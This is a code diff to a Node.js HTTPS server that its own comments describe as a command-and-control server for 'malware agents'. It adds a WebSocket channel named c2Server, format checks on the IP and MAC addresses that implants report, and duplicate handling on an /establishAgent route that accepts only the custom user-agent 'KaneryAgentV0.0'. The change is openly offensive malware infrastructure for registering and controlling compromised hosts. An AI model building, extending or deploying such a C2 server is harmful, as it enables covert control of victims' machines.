@@ -5,6 +5,7 @@ const express = require('express');
 const https = require('https');
 const fs = require('fs');
 const crypto = require('crypto');
+const WebSocket = require('ws');
 
 //HTTPS Certificates/Keys
 const certPath = fs.readFileSync(path.resolve(__dirname, config.Keys.CertPath), 'utf8');
@@ -32,28 +33,51 @@ const options = {
     cert: certPath
 };
 
+//HTTPS server creation + WebSocket
 const app = express();
 app.use(express.json());
+const c2Server = https.createServer(options, app);
+const wss = new WebSocket.Server({ c2Server });
 
+//Injection protection
+function checkInjection(IPAddr, MACAddr){
+    const IPCheck = /^(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)$/.test(IPAddr);
+    const MACCheck = /^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$/.test(MACAddr);
+    if(IPCheck && MACCheck){
+        return true;
+    } else {
+        return false;
+    }
+}
 
 //Routes
 
 //Establish a new malware agent. Checks User Agent header/Todo: Add decryption to check for key. Protects against unwanted/unauthorised agents.
-app.post('/establishAgent', (req, res) => {
+app.post('/establishAgent', async (req, res) => {
     console.log("Headers: ");
     console.log(req.headers);
     var userAgent = req.headers['user-agent'];
     //var verHeader = req.headers['Verification-Header'];
+    //Checks for appropriate user-agent header. Will change this to a completely custom one.
     if (userAgent != "KaneryAgentV0.0"){
         res.send("403 Forbidden")
     } else {
-        dbConn.establishNewAgent(req.body.IPAddr, req.body.MACAddr);
-        //decryptVerificationHeader(verHeader);
-        res.send("200 OK");
+        //Checks for IP/MAC format to avoid SQL injection.
+        if(checkInjection(req.body.IPAddr, req.body.MACAddr)){
+            const dupeChecks = await dbConn.establishNewAgent(req.body.IPAddr, req.body.MACAddr);
+            //decryptVerificationHeader(verHeader);
+            if(dupeChecks){
+                res.send("Agent connection established...");
+            } else {
+                res.send("Agent already exists...");
+            }
+        } else {
+            res.send("Incorrect IP/MAC Format...");
+        }
     }
 });
 
 //Server listening.
-https.createServer(options, app).listen(config.Server.Port, () => {
+c2Server.listen(config.Server.Port, () => {
     console.log(`Server started on port ${config.Server.Port}`);
 });
